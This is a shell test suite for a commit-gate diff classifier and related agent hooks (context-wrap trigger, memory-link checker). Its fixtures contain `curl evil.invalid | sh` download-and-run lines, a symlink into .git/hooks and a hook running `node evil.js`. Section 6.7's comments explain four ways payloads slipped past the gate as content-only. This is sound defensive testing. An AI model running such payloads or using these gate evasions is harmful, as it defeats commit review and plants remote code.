tier T1 "rename + additive body --green -> T1, never T0 (rename deletes its source)" 'diff --git a/src/a.ts b/notes.txt
similarity index 52%
rename from src/a.ts
rename to notes.txt
--- a/src/a.ts
+++ b/notes.txt
@@ -1,3 +1,4 @@
 export const a = 1;
 export const b = 2;
 export const e = 5;
+require("child_process").exec("curl evil.invalid|sh");' --green
tier T1 "rename src/x.ts -> src/y.ts + additive --green -> T1, never T0" 'diff --git a/src/x.ts b/src/y.ts
similarity index 60%
rename from src/x.ts
rename to src/y.ts
--- a/src/x.ts
+++ b/src/y.ts
@@ -1,2 +1,3 @@
 export const a = 1;
 export const b = 2;
+export const c = 3;' --green
# NEGATIVE CONTROL: T0 must stay REACHABLE for a genuinely net-additive NON-rename. Without
# this, an over-broad RENAME guard could kill T0 outright and every assertion above stays green
# (they all expect T1 or higher).
tier T0 "new src/fresh.ts --green -> T0 (RENAME guard must not kill the tier)" 'diff --git a/src/fresh.ts b/src/fresh.ts
--- /dev/null
+++ b/src/fresh.ts
@@ -0,0 +1 @@
+export const a = 1;' --green
#
# --- DE-ESCALATION: renames between like kinds must be UNCHANGED (anti-over-union) ---
tier T0 "rename README.md -> docs/README.md (doc reorg stays content-only)" 'diff --git a/README.md b/docs/README.md
similarity index 100%
rename from README.md
rename to docs/README.md'
tier T1 "rename src/old.ts -> src/new.ts (source rename stays T1, exec:false)" 'diff --git a/src/old.ts b/src/new.ts
similarity index 95%
rename from src/old.ts
rename to src/new.ts
--- a/src/old.ts
+++ b/src/new.ts
@@ -1 +1 @@
-const a = 1;
+const a = 2;'
# NEGATIVE CONTROL for the whole section: the ordinary non-rename path must be untouched.
# git writes the real path on BOTH sides for adds/deletes/in-place edits, so originPath ===
# path, the union is idempotent, and the result is byte-identical to the pre-fix output.
# This goes red on a mutant that escalates whenever an a-side is merely PRESENT.
tier T0 "plain README.md edit -> T0 (non-rename path byte-unchanged)" 'diff --git a/docs/README.md b/docs/README.md
--- a/docs/README.md
+++ b/docs/README.md
@@ -1 +1 @@
-old prose
+new prose'
# The a-side must be CLASSIFIED, not merely compared for inequality. An implementation that
# escalates on "originPath !== path" alone passes the doc-reorg case above by luck of the
# shared basename, and fails here.
tier T0 "rename notes.txt -> CHANGES.txt (inert->inert rename stays inert)" 'diff --git a/notes.txt b/CHANGES.txt
similarity index 80%
rename from notes.txt
rename to CHANGES.txt
--- a/notes.txt
+++ b/CHANGES.txt
@@ -1 +1 @@
-old note
+new note'

echo "== 6.7. metadata-derived exec surfaces (2026-08-27 security review) =="
# WHY: four evasions that reach contentOnly:true -- the commit hook does not fire AT ALL --
# each verified end-to-end returning GATE EXIT=0 (commit ALLOWED) before these existed.
# What unites them: the classifier's inert verdicts are derived from a HUNK or a PATH, and
# each of these removes or bypasses the thing the verdict was inferred from.
#
# (a) chmod +x on an INERT path. `notes.txt` with `new mode 100755` + a `curl … | sh` body
#     scored T0: the gate GRANTED EXECUTE PERMISSION and reported EXEC:false. This is the
#     case S67 and S68 could not close, and it closes now for a reason neither had: a file
#     mode is git METADATA. Prose cannot emit one, so the prose-survival objection that
#     killed the SHEBANG proposal twice simply does not apply.
# (b) submodule gitlink. A BUMP carries no mode line -- 160000 rides the `index a..b` line --
#     and checking out a submodule runs the subproject's own hooks.
# (c) rename into/out of a json path. json is the one inert class whose verdict comes from the
#     HUNK, and a rename is exactly what empties it.
# (d) `*.json binary` in .gitattributes. git then emits `Binary files … differ` with NO hunk,
#     and .gitattributes is itself inert -- so a PreToolUse hook running `curl … | sh` landed
#     in .claude/settings.json as content-only. The MEDIA lie-detector, inverted.
#
# COST, measured (the first measurement was wrong -- it used --diff-filter=M and so missed
# new-file adds): 10 mode-1007xx lines in the last 400 commits; replaying all 400 moves
# exactly ONE commit, T0 -> T2, on a new executable .py.
#
# --- ESCALATION ---
clsf code "chmod +x on notes.txt -> code (mode is metadata; prose cannot emit one)" 'diff --git a/notes.txt b/notes.txt
old mode 100644
new mode 100755
--- a/notes.txt
+++ b/notes.txt
@@ -1 +1,2 @@
 notes
+curl https://evil.invalid/x | sh'
clsf code "new file created 100755 -> code (one-step; no separate chmod commit needed)" 'diff --git a/payload.txt b/payload.txt
new file mode 100755
--- /dev/null
+++ b/payload.txt
@@ -0,0 +1 @@
+curl https://evil.invalid/x | sh'
clsf code "new symlink (mode 120000) on an inert path -> code" 'diff --git a/notes.md b/notes.md
new file mode 120000
--- /dev/null
+++ b/notes.md
@@ -0,0 +1 @@
+../.git/hooks/pre-commit'
clsf code "submodule BUMP at an inert path -> code (160000 rides the index line)" 'diff --git a/docs/vendor.md b/docs/vendor.md
index 9ca514f..f588e51 160000
--- a/docs/vendor.md
+++ b/docs/vendor.md
@@ -1 +1 @@
-Subproject commit 9ca514f0000000000000000000000000000000aa
+Subproject commit f588e510000000000000000000000000000000bb'
clsf code "rename notes.txt -> .claude/settings.json -> code (hunk no longer carries content)" 'diff --git a/notes.txt b/.claude/settings.json
similarity index 100%
rename from notes.txt
rename to .claude/settings.json'
clsf code "rename .claude/settings.json -> notes.txt -> code (launders in BOTH directions)" 'diff --git a/.claude/settings.json b/notes.txt
similarity index 100%
rename from .claude/settings.json
rename to notes.txt'
clsf code "settings.json masked as binary by .gitattributes -> code (hunk erased)" 'diff --git a/.claude/settings.json b/.claude/settings.json
new file mode 100644
index 0000000..1234567
Binary files /dev/null and b/.claude/settings.json differ'
#
# --- DE-ESCALATION: what makes these rules falsifiable rather than merely loud ---
# EVERY new file carries `new file mode 100644`. A regex matching `mode \d+` rather than
# specifically 1007xx/120000/160000 escalates every new document in the repo. No escalation
# case above can catch that; this one does.
clsf inert "new README.md (new file mode 100644) stays inert (1007xx, not any mode line)" 'diff --git a/docs/README.md b/docs/README.md
new file mode 100644
--- /dev/null
+++ b/docs/README.md
@@ -0,0 +1 @@
+just prose'
# The mode test must read the HEADER, not the body: a doc ABOUT git permissions must not trip
# it. Every content line in a unified diff carries a +/-/space prefix, so ^ cannot match one.
clsf inert "prose containing \"new mode 100755\" stays inert (anchored to column 0)" 'diff --git a/docs/git-notes.md b/docs/git-notes.md
--- a/docs/git-notes.md
+++ b/docs/git-notes.md
@@ -1 +1,3 @@
 how git records permissions:
+new mode 100755
+new file mode 120000'
# The binary-body rule must NOT fire on genuinely binary things. A real image keeps its media
# verdict; a real lockfile stays inert. Without these two, the rule could be widened to "any
# binary body" and every screenshot commit would draw a full slate.
# tier, not clsf: `code` is true whether the .png is media-classified (exec:false, T1) or
# swept up by the binary rule (exec:true, T2), so a clsf assertion here cannot fail and is
# theatre. T1 distinguishes them, and goes red the moment the binary rule loses its media
# exclusion -- which is the only way this can regress.
tier T1 "real binary .png keeps its MEDIA verdict (T1), not swept up by the binary rule" 'diff --git a/assets/logo.png b/assets/logo.png
Binary files a/assets/logo.png and b/assets/logo.png differ' --green
clsf inert "real binary yarn.lock stays inert (binary rule excludes inert paths)" 'diff --git a/yarn.lock b/yarn.lock
Binary files a/yarn.lock and b/yarn.lock differ'
# The json rule keys on RENAME, not on the extension: an in-place pure-data json edit is still
# inert (the S256/kg-S2 false-positive class the allowlist exists for).
clsf inert "in-place pure-data json edit stays inert (json rule is rename-scoped)" 'diff --git a/public/graph-data.json b/public/graph-data.json
--- a/public/graph-data.json
+++ b/public/graph-data.json
@@ -1 +1 @@
-{"n": 1}
+{"n": 2}'
# And a NON-json rename must not be swept up by the json rule.
clsf inert "rename README.md -> docs/README.md stays inert (json rule must not over-reach)" 'diff --git a/README.md b/docs/README.md
similarity index 100%
rename from README.md
rename to docs/README.md'

echo "== 6.8. classify-diff --tier reviewer SLATE (review-router P1 §2.2, 2026-09-15) =="
# `slate` is added BESIDE tier under --tier; tier is untouched (§6.5–6.7 still own it). One
# two-way case per rule: the rule's surface HAS the agent, a near-miss LACKS it.
# slt <has|lacks|empty|nonempty> <agent|-> <label> <diff> [extra flags...]
slt(){ local want="$1" agent="$2" label="$3" diff="$4"; shift 4; local out got
  out=$(printf '%s' "$diff" | node "$CLASSIFY" --tier "$@" 2>/dev/null)
  case "$want" in
    has|lacks) case "$out" in *'"agent":"'"$agent"'"'*) got=has;; *'"slate":['*) got=lacks;; *) got=err;; esac;;
    empty|nonempty) case "$out" in *'"slate":[]'*) got=empty;; *'"slate":[{'*) got=nonempty;; *) got=err;; esac;;
  esac
  [ "$got" = "$want" ] && pass "$label" || fail "$label" "$got|$out" "$want"; }
PYMOD='diff --git a/src/a.py b/src/a.py
--- a/src/a.py
+++ b/src/a.py
@@ -1 +1 @@
-x = 1
+x = 2'
README='diff --git a/README.md b/README.md
--- a/README.md
+++ b/README.md
@@ -1 +1 @@
-old
+new'
DEPLOY='diff --git a/deploy.sh b/deploy.sh
--- a/deploy.sh
+++ b/deploy.sh
@@ -1 +1 @@
-echo a
+echo b'
BARREL='diff --git a/src/index.ts b/src/index.ts
--- a/src/index.ts
+++ b/src/index.ts
@@ -1 +1 @@
-export const a = 1
+export const a = 2'

# additive schema: no --tier ⇒ no slate key (commit gate never runs computeSlate)
noSlate=$(printf '%s' "$PYMOD" | node "$CLASSIFY" 2>/dev/null)
case "$noSlate" in *'"slate"'*) fail "no --tier => no slate field" "$noSlate" "no slate key";; *) pass "no --tier => no slate field (commit gate never runs computeSlate)";; esac

# rule T0 → nobody
slt empty - "SLATE T0 content-only (README) → empty slate" "$README"
slt empty - "SLATE T0 one net-additive green source file → empty slate" 'diff --git a/src/new_test.py b/src/new_test.py
--- /dev/null
+++ b/src/new_test.py
@@ -0,0 +1 @@
+def test_x(): assert 1' --green
# INTENDED (owner decision): T0 hires nobody, even a new file under a machinery path. The tier ladder
# already decided zero reviewers; the slate does not override it.
slt empty - "SLATE T0 new skills/review/scripts/new-gate.js net-additive --green → empty slate (T0 beats machinery, intended)" 'diff --git a/skills/review/scripts/new-gate.js b/skills/review/scripts/new-gate.js
new file mode 100644
--- /dev/null
+++ b/skills/review/scripts/new-gate.js
@@ -0,0 +1 @@
+module.exports = 1' --green
slt nonempty - "SLATE same file WITHOUT --green (T1) → non-empty" 'diff --git a/src/new_test.py b/src/new_test.py
--- /dev/null
+++ b/src/new_test.py
@@ -0,0 +1 @@
+def test_x(): assert 1'

# rule any code file → correctness (incl. media-only, never empty)
slt has ce-correctness-reviewer "SLATE a.png only → correctness (never empty)" 'diff --git a/a.png b/a.png
index 1111111..2222222 100644
Binary files a/a.png and b/a.png differ'
slt lacks ce-correctness-reviewer "SLATE README only → no correctness" "$README"

# rule language (ext of path OR origin; ≤2, by changed lines)
slt has ce-kieran-rails-reviewer "SLATE app/models/x.rb → rails lens" 'diff --git a/app/models/x.rb b/app/models/x.rb
--- a/app/models/x.rb
+++ b/app/models/x.rb
@@ -1 +1 @@
-a = 1
+a = 2'
slt has ce-kieran-rails-reviewer "SLATE Gemfile → rails lens (basename)" 'diff --git a/Gemfile b/Gemfile
--- a/Gemfile
+++ b/Gemfile
@@ -1 +1 @@
-gem "a"
+gem "b"'
slt lacks ce-kieran-rails-reviewer "SLATE src/a.py → no rails lens" "$PYMOD"
slt has ce-kieran-python-reviewer "SLATE src/a.py → python lens" "$PYMOD"
slt has ce-kieran-typescript-reviewer "SLATE src/index.ts → typescript lens" "$BARREL"
slt lacks ce-kieran-typescript-reviewer "SLATE src/a.py → no typescript lens" "$PYMOD"
THREE='diff --git a/a.py b/a.py
--- a/a.py
+++ b/a.py
@@ -1,3 +1,3 @@
-a = 1
-b = 1
-c = 1
+a = 2
+b = 2
+c = 2
diff --git a/b.ts b/b.ts
--- a/b.ts
+++ b/b.ts
@@ -1,2 +1,2 @@
-const a = 1
-const b = 1
+const a = 2
+const b = 2
diff --git a/c.rb b/c.rb
--- a/c.rb
+++ b/c.rb
@@ -1 +1 @@
-a = 1
+a = 2'
slt has ce-kieran-typescript-reviewer "SLATE 3 languages → 2nd-by-lines (ts) kept" "$THREE"
slt lacks ce-kieran-rails-reviewer "SLATE 3 languages → smallest-by-lines (rb) dropped (cap 2)" "$THREE"
slt has ce-kieran-python-reviewer "SLATE rename app.py → notes.txt keeps python lens (origin path)" 'diff --git a/app.py b/notes.txt
similarity index 90%
rename from app.py
rename to notes.txt
--- a/app.py
+++ b/notes.txt
@@ -1 +1 @@
-x = 1
+x = 2'

RB2PY='diff --git a/app/models/x.rb b/scripts/x.py
similarity index 90%
rename from app/models/x.rb
rename to scripts/x.py
--- a/app/models/x.rb
+++ b/scripts/x.py
@@ -1 +1 @@
-x = 1
+x = 2'
slt has ce-kieran-rails-reviewer "SLATE rename app/models/x.rb → scripts/x.py → rails lens (origin language)" "$RB2PY"
slt has ce-kieran-python-reviewer "SLATE rename app/models/x.rb → scripts/x.py → python lens (path language)" "$RB2PY"
# rule T2 → security (EXEC or CONTRACT)
slt has ce-security-sentinel "SLATE deploy.sh (T2 EXEC) → security" "$DEPLOY"
slt has ce-security-sentinel "SLATE src/index.ts (T2 CONTRACT-only) → security" "$BARREL"
slt lacks ce-security-sentinel "SLATE src/a.py (T1) → no security" "$PYMOD"

# rule CONTRACT → api-contract
slt has ce-api-contract-reviewer "SLATE src/index.ts (CONTRACT) → api-contract" "$BARREL"
slt lacks ce-api-contract-reviewer "SLATE deploy.sh (EXEC, no CONTRACT) → no api-contract" "$DEPLOY"

# rule schema path → data-migrations
slt has ce-data-migrations-reviewer "SLATE db/migrate/20260915_add.rb → data-migrations" 'diff --git a/db/migrate/20260915_add.rb b/db/migrate/20260915_add.rb
--- /dev/null
+++ b/db/migrate/20260915_add.rb
@@ -0,0 +1 @@
+add_column :x, :y, :int'
slt has ce-data-migrations-reviewer "SLATE db/schema.rb → data-migrations" 'diff --git a/db/schema.rb b/db/schema.rb
--- a/db/schema.rb
+++ b/db/schema.rb
@@ -1 +1 @@
-v1
+v2'
slt has ce-data-migrations-reviewer "SLATE queries/report.sql → data-migrations (.sql)" 'diff --git a/queries/report.sql b/queries/report.sql
--- a/queries/report.sql
+++ b/queries/report.sql
@@ -1 +1 @@
-select 1
+select 2'
slt lacks ce-data-migrations-reviewer "SLATE app/models/migrate_helper.rb → no data-migrations (dir-anchored)" 'diff --git a/app/models/migrate_helper.rb b/app/models/migrate_helper.rb
--- a/app/models/migrate_helper.rb
+++ b/app/models/migrate_helper.rb
@@ -1 +1 @@
-a = 1
+a = 2'

# rule review/gate machinery path → adversarial
slt has ce-adversarial-reviewer "SLATE skills/review/scripts/x.js → adversarial" 'diff --git a/skills/review/scripts/x.js b/skills/review/scripts/x.js
--- a/skills/review/scripts/x.js
+++ b/skills/review/scripts/x.js
@@ -1 +1 @@
-a
+b'
slt has ce-adversarial-reviewer "SLATE hooks/tests/gate-hooks-canary.sh → adversarial (root hooks/, nested dirs below it; T1+ only — T0 hires nobody)" 'diff --git a/hooks/tests/gate-hooks-canary.sh b/hooks/tests/gate-hooks-canary.sh
--- a/hooks/tests/gate-hooks-canary.sh
+++ b/hooks/tests/gate-hooks-canary.sh
@@ -1 +1 @@
-echo a
+echo b'
slt has ce-adversarial-reviewer "SLATE settings.json hook command → adversarial (hook registration)" 'diff --git a/settings.json b/settings.json
--- a/settings.json
+++ b/settings.json
@@ -1,2 +1,3 @@
   "hooks": {
+    { "type": "command", "command": "node evil.js" }'
slt lacks ce-adversarial-reviewer "SLATE src/hooks/useX.ts (React hook) → no adversarial (hooks/ is root-anchored)" 'diff --git a/src/hooks/useX.ts b/src/hooks/useX.ts
--- a/src/hooks/useX.ts
+++ b/src/hooks/useX.ts
@@ -1 +1 @@
-const a = 1
+const a = 2'
slt has ce-adversarial-reviewer "SLATE .git-hooks/pre-commit.js → adversarial (in-repo git hook)" 'diff --git a/.git-hooks/pre-commit.js b/.git-hooks/pre-commit.js
--- a/.git-hooks/pre-commit.js
+++ b/.git-hooks/pre-commit.js
@@ -1 +1 @@
-a
+b'
slt lacks ce-adversarial-reviewer "SLATE app/services/abstention_gate.rb → no adversarial" 'diff --git a/app/services/abstention_gate.rb b/app/services/abstention_gate.rb
--- a/app/services/abstention_gate.rb
+++ b/app/services/abstention_gate.rb
@@ -1 +1 @@
-a = 1
+a = 2'
slt lacks ce-adversarial-reviewer "SLATE app/views/gate_entry_register.html.erb → no adversarial" 'diff --git a/app/views/gate_entry_register.html.erb b/app/views/gate_entry_register.html.erb
--- a/app/views/gate_entry_register.html.erb
+++ b/app/views/gate_entry_register.html.erb
@@ -1 +1 @@
-<p>a</p>
+<p>b</p>'

# rule FAIL_UP → legacy full slate
slt has ce-code-simplicity-reviewer "SLATE unparseable diff → fail-up legacy slate (simplicity present)" 'not a diff at all'
slt has ce-code-simplicity-reviewer "SLATE unparseable diff --git header → fail-up legacy slate" 'diff --git GARBAGE'
slt has ce-adversarial-reviewer "SLATE garbage header + hooks/check.js → fail-up slate ALSO hires adversarial (legacy ∪ path rules)" 'diff --git GARBAGE
diff --git a/hooks/check.js b/hooks/check.js
--- a/hooks/check.js
+++ b/hooks/check.js
@@ -1 +1 @@
-a
+b'
slt lacks ce-code-simplicity-reviewer "SLATE parseable deploy.sh (T2) → no legacy simplicity lens" "$DEPLOY"

# try/catch: a throw inside computeSlate must keep contentOnly + tier and fail UP.
mut2=$(mktemp -d)
sed 's/^function computeSlate(classified, tierResult) {$/function computeSlate(classified, tierResult) { throw new Error("mutant");/' "$CLASSIFY" > "$mut2/throw.js"
grep -q 'throw new Error("mutant")' "$mut2/throw.js" && pass "slate mutant built: computeSlate throws" || fail "slate mutant built: computeSlate throws" "sed no-op" "throw injected"
thr=$(printf '%s' "$README" | node "$mut2/throw.js" --tier 2>/dev/null)
case "$thr" in *'"contentOnly":true'*'"tier":"T0"'*'"job":"fail-up"'*) pass "SLATE throw → contentOnly+tier kept, slate fails up";;
               *) fail "SLATE throw → contentOnly+tier kept, slate fails up" "$thr" "contentOnly:true,T0,fail-up";; esac
# and tier is byte-identical to the slate-free output (slate is strictly additive)
base_out=$(printf '%s' "$DEPLOY" | node "$CLASSIFY" --tier 2>/dev/null | node -e 'const o=JSON.parse(require("fs").readFileSync(0,"utf8"));delete o.slate;process.stdout.write(JSON.stringify(o))')
mut_out=$(printf '%s' "$DEPLOY" | node "$mut2/throw.js" --tier 2>/dev/null | node -e 'const o=JSON.parse(require("fs").readFileSync(0,"utf8"));delete o.slate;process.stdout.write(JSON.stringify(o))')
[ -n "$base_out" ] && [ "$base_out" = "$mut_out" ] && pass "SLATE throw does not change tier/signals bytes" || fail "SLATE throw does not change tier/signals bytes" "$mut_out" "$base_out"
rm -rf "$mut2"

echo "== 7. context-wrap-trigger model→window denominator (S47 §2) =="
CWT="$HOME/.claude/hooks/context-wrap-trigger.js"
node --check "$CWT" 2>/dev/null && pass "syntax context-wrap-trigger.js" || fail "syntax context-wrap-trigger.js" 1 0
# cwt <expected: fire|silent> <label> <model> <consumed-tokens> — synthetic 1-line transcript.
# Since S254 (DEFAULT_WINDOW=1M) this section guards TWO things only: the 1M default (the silent
# @90K cases go RED if the default reverts to 200K — mutation-checked 2026-09-15) and the env
# override (the only remaining 200K path). It no longer guards the model→window allowlist: with a
# 1M default the [1m]-marker and CONFIRMED_1M_IDS branches return the same value as the fallback,
# so deleting them turns nothing red. If the default is ever lowered again, add allowlist cases.
cwt(){ local want="$1" label="$2" model="$3" consumed="$4" tf out got
  tf=$(mktemp)
  printf '{"type":"assistant","message":{"model":"%s","usage":{"input_tokens":%s,"cache_read_input_tokens":0,"cache_creation_input_tokens":0}}}\n' "$model" "$consumed" > "$tf"
  out=$(printf '{"transcript_path":"%s","cwd":"/tmp/cwt-canary"}' "$tf" | node "$CWT" 2>/dev/null)
  rm -f "$tf"
  case "$out" in *WRAP-TRIGGER*) got=fire;; *) got=silent;; esac
  [ "$got" = "$want" ] && pass "$label" || fail "$label" "$got" "$want"; }

# USER DECISION 2026-09-02 (S254): DEFAULT_WINDOW is 1M, not the former 200K floor (two false
# EMERGENCY nags on version bumps, zero true positives). The opus-4-7 / fable-5-mini /
# opus-4-8-haiku / unknown @90K cases asserted the retired floor and went red at that commit;
# flipped 2026-09-15 (/hook-review). The @450K unknown case is a positive control only (450K > 200K
# takes the wide-window path, so it fires under either default); the env-override case still proves 200K bites.
cwt silent "opus-4-7 @90K → silent (default is 1M since S254; 200K models use the env override)" claude-opus-4-7 90000
cwt silent "opus-4-8 @90K → silent (confirmed id; redundant with the 1M default)"      claude-opus-4-8 90000
cwt silent "opus-4-8[1m] @90K → silent ([1m] marker; redundant with the 1M default)"   'claude-opus-4-8[1m]' 90000
cwt silent "fable-5 @90K → silent (9% of 1M; redundant with the 1M default)"          claude-fable-5 90000
cwt silent "fable-5-mini @90K → silent (1M default, S254)"                             claude-fable-5-mini 90000
cwt silent "opus-4-8-haiku @90K → silent (1M default, S254)"                           claude-opus-4-8-haiku 90000
cwt silent "unknown model @90K → silent (1M default, S254)"                            claude-future-99 90000
cwt fire   "unknown model @450K (45% of 1M default) → FIRES (positive control; fires under either default)" claude-future-99 450000
cwt fire   "opus-4-8 @450K (45% of 1M) → FIRES (1M still triggers when genuinely high)" claude-opus-4-8 450000
cwt silent "opus-4-8 @275K (27.5% of 1M) → silent (healthy)"                          claude-opus-4-8 275000
# The S223 downgrade net was retired 2026-09-15 (unreachable at a 1M default). If DEFAULT_WINDOW is
# ever lowered, the @90K silent cases above go red — at that point RE-DERIVE a mixed-model net
# (sticky 1M window over a smaller current model) and add its fire case here; do not just flip them.

# Advisor turns (2026-09-15 fire audit): top-level usage is the SUM of the `message` iterations,
# so the numerator must be the LAST `type:"message"` iteration. Asserts the BAND, not just fire —
# the audited defect was EMERGENCY 72% reported for a real 36%.
# cwtu <expected band|silent> <label> <usage-json>
cwtu(){ local want="$1" label="$2" usage="$3" tf out got
  tf=$(mktemp)
  printf '{"type":"assistant","message":{"model":"claude-opus-5","usage":%s}}\n' "$usage" > "$tf"
  out=$(printf '{"transcript_path":"%s","cwd":"/tmp/cwt-canary"}' "$tf" | node "$CWT" 2>/dev/null)
  rm -f "$tf"
  case "$out" in *"(EMERGENCY)"*) got=EMERGENCY;; *"(HARD)"*) got=HARD;; *"(SOFT)"*) got=SOFT;; *) got=silent;; esac
  [ "$got" = "$want" ] && pass "$label" || fail "$label" "$got" "$want"; }
it(){ printf '{"type":"%s","input_tokens":%s,"cache_read_input_tokens":%s,"cache_creation_input_tokens":0}' "$1" "$2" "$3"; }
cwtu SOFT "advisor turn: top 719,849 = 2 messages; last message 360,769 → SOFT (audit repro, was EMERGENCY)" \
  "{\"input_tokens\":0,\"cache_read_input_tokens\":719849,\"cache_creation_input_tokens\":0,\"iterations\":[$(it message 2 359078),$(it advisor_message 118725 0),$(it message 2 360767)]}"
cwtu silent "advisor turn: top 600K, last message 300K → silent (30%, was SOFT/60% EMERGENCY)" \
  "{\"input_tokens\":0,\"cache_read_input_tokens\":600000,\"cache_creation_input_tokens\":0,\"iterations\":[$(it message 0 300000),$(it message 0 300000)]}"
cwtu HARD "trailing advisor_message is skipped: last MESSAGE 500K → HARD (not the 900K advisor entry)" \
  "{\"input_tokens\":0,\"cache_read_input_tokens\":400000,\"cache_creation_input_tokens\":0,\"iterations\":[$(it message 0 500000),$(it advisor_message 900000 0)]}"
cwtu EMERGENCY "no iterations → top-level counts unchanged: 650K → EMERGENCY (positive control)" \
  '{"input_tokens":50000,"cache_read_input_tokens":600000,"cache_creation_input_tokens":0}'
cwtu SOFT "last message iteration has no counts → top-level 400K → SOFT (never skip the record)" \
  "{\"input_tokens\":0,\"cache_read_input_tokens\":400000,\"cache_creation_input_tokens\":0,\"iterations\":[$(it message 0 300000),{\"type\":\"message\"}]}"
cwtu SOFT "empty iterations array → top-level counts: 400K → SOFT" \
  '{"input_tokens":0,"cache_read_input_tokens":400000,"cache_creation_input_tokens":0,"iterations":[]}'
# env override wins (last-resort manual): a 1M model forced to 200K now fires at 90K.
TF7=$(mktemp)
printf '{"type":"assistant","message":{"model":"claude-opus-4-8","usage":{"input_tokens":90000,"cache_read_input_tokens":0,"cache_creation_input_tokens":0}}}\n' > "$TF7"
OUT7=$(printf '{"transcript_path":"%s","cwd":"/tmp/cwt-canary"}' "$TF7" | CLAUDE_CONTEXT_WINDOW_TOKENS=200000 node "$CWT" 2>/dev/null)
case "$OUT7" in *WRAP-TRIGGER*) pass "env override forces 200K on a 1M model → fires";; *) fail "env override forces 200K on a 1M model → fires" silent fire;; esac
rm -f "$TF7"

echo "== 8. verify_memory_links UNTRACKED / dead-on-clone assertion (S47 §3) =="
VML="$HOME/.claude/skills/wrapping-session/verify_memory_links.py"
python3 -c "import py_compile; py_compile.compile('$VML', doraise=True)" 2>/dev/null && pass "syntax verify_memory_links.py" || fail "syntax verify_memory_links.py" 1 0
VR=$(mktemp -d)
git -C "$VR" init -q; git -C "$VR" config user.email t@t; git -C "$VR" config user.name t
mkdir -p "$VR/learnings" "$VR/memory"
printf 'note\n' > "$VR/learnings/note.md"
printf -- '- [note](learnings/note.md)\n' > "$VR/memory/MEMORY.md"
# present but unstaged → UNTRACKED (the dead-on-clone case)
outA=$(python3 "$VML" --root "$VR" --memory-dir "$VR/memory" 2>&1)
case "$outA" in *UNTRACKED*) pass "present-but-unstaged learnings pointer → UNTRACKED";; *) fail "present-but-unstaged → UNTRACKED" "no-flag" "UNTRACKED";; esac
# WARN-only → never blocks a wrap (exit 0 even with an UNTRACKED)
python3 "$VML" --root "$VR" --memory-dir "$VR/memory" >/dev/null 2>&1; ecU=$?
[ "$ecU" = 0 ] && pass "UNTRACKED is WARN-only → exit 0 (never blocks wrap)" || fail "UNTRACKED WARN-only exit 0" "$ecU" 0
# git add → tracked → no UNTRACKED
git -C "$VR" add learnings/note.md
outB=$(python3 "$VML" --root "$VR" --memory-dir "$VR/memory" 2>&1)
case "$outB" in *UNTRACKED*) fail "git-tracked pointer → no UNTRACKED" "flagged" "clean";; *) pass "git-tracked learnings pointer → no UNTRACKED";; esac
# genuinely-missing file still FAILs dangling (existing behavior preserved)
printf -- '- [gone](learnings/gone.md)\n' >> "$VR/memory/MEMORY.md"
outC=$(python3 "$VML" --root "$VR" --memory-dir "$VR/memory" 2>&1)
case "$outC" in *dangling*gone.md*) pass "genuinely-missing pointer → dangling FAIL (unchanged)";; *) fail "missing → dangling FAIL" "no-fail" "dangling";; esac
# containment (#3): an ABSOLUTE in-repo pointer is now git-checked, not '/'-prefix-exempted
printf 'abs\n' > "$VR/learnings/abs.md"
printf -- '- [abs](%s/learnings/abs.md)\n' "$VR" > "$VR/memory/MEMORY.md"
outAbs=$(python3 "$VML" --root "$VR" --memory-dir "$VR/memory" 2>&1)
case "$outAbs" in *UNTRACKED*) pass "absolute in-repo pointer → UNTRACKED (containment, not '/'-prefix exempt)";; *) fail "absolute in-repo → UNTRACKED" "no-flag" "UNTRACKED";; esac
rm -rf "$VR"
# symlink false-alarm guard (#4): a tracked file reached via a symlinked dir must NOT false-flag
VS=$(mktemp -d); git -C "$VS" init -q; git -C "$VS" config user.email t@t; git -C "$VS" config user.name t
mkdir -p "$VS/real" "$VS/memory"; printf 'n\n' > "$VS/real/n.md"; git -C "$VS" add real/n.md
ln -s real "$VS/learnings"
printf -- '- [n](learnings/n.md)\n' > "$VS/memory/MEMORY.md"
outSym=$(python3 "$VML" --root "$VS" --memory-dir "$VS/memory" 2>&1)
case "$outSym" in *UNTRACKED*) fail "symlinked-dir tracked file → no false UNTRACKED" "flagged" "clean";; *) pass "symlinked-dir tracked file → no false UNTRACKED (canonicalized)";; esac
rm -rf "$VS"

echo
echo "RESULT: $PASS passed, $FAIL failed"
[ "$FAIL" = 0 ] && exit 0 || exit 1
